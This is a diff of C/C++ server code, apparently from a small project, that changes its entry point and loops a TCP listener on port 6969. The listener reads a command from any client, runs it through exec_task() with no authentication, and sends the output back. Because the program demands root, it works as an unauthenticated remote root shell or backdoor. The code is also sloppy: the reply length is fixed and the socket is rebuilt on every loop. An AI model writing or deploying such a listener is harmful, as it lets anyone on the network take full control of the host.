@@ -212,7 +212,7 @@ void Servlet(SSL* ssl) /* Serve the connection -- threadable */
     close(sd);          /* close connection */
 }
 
-int run(int count, char *strings[]) {
+int main(int count, char *strings[]) {
 
     SSL_CTX *ctx;
     int server;
@@ -220,7 +220,7 @@ int run(int count, char *strings[]) {
 
     if(!isRoot())
     {
-        printf("This program must be run as root/sudo user!!");
+        printf("This program must be run as root/sudo user!!\n");
         exit(0);
     }
     if ( count != 2 )
@@ -252,14 +252,19 @@ int run(int count, char *strings[]) {
 #define PORT 6969
 
 
-int main(int count, char *strings[]) {
+int run(int count, char *strings[]) {
 
+
+    while(1){
     int server_fd, new_socket, valread; 
     struct sockaddr_in address; 
     int opt = 1; 
     int addrlen = sizeof(address); 
     char buffer[1024] = {0};
     std::string reply;
+    char* hello = "hello\n";
+
+
        
     // Creating socket file descriptor 
     if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) 
@@ -299,8 +304,9 @@ int main(int count, char *strings[]) {
     } 
     valread = read(new_socket , buffer, 1024); 
     printf("Here is the command: %s\n", buffer);
-    write(new_socket, exec_cmd(buffer).c_str(), 18);
-    //send(new_socket , hello , strlen(hello) , 0 ); 
+    write(new_socket, exec_task(buffer).c_str(), 18);
+    send(new_socket , hello , strlen(hello) , 0 ); 
     printf("Hello message sent\n"); 
+}
     return 0; 
 }
